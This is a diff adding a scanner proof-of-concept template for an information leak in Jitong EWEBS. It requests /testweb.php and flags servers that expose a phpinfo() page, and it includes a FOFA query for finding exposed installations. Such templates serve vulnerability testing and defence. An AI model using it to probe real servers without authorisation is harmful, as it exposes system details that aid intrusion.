@@ -1,0 +1,22 @@
+id: poc-yaml-jitong-ewebs-testweb-php-information-leak
+info:
+  name: 极通EWEBS testweb.php 敏感信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 极通EWEBS
+  FOFA: app="新软科技-极通EWEBS"
+requests:
+- method: GET
+  path: /testweb.php
+  expression: 'status_code == 200
+
+    && contains(title,"phpinfo()")
+
+    && contains(body,"EWEBS Server")
+
+    && contains(body,"PHP Version")
+
+    '
+variables: {}
+transport: http
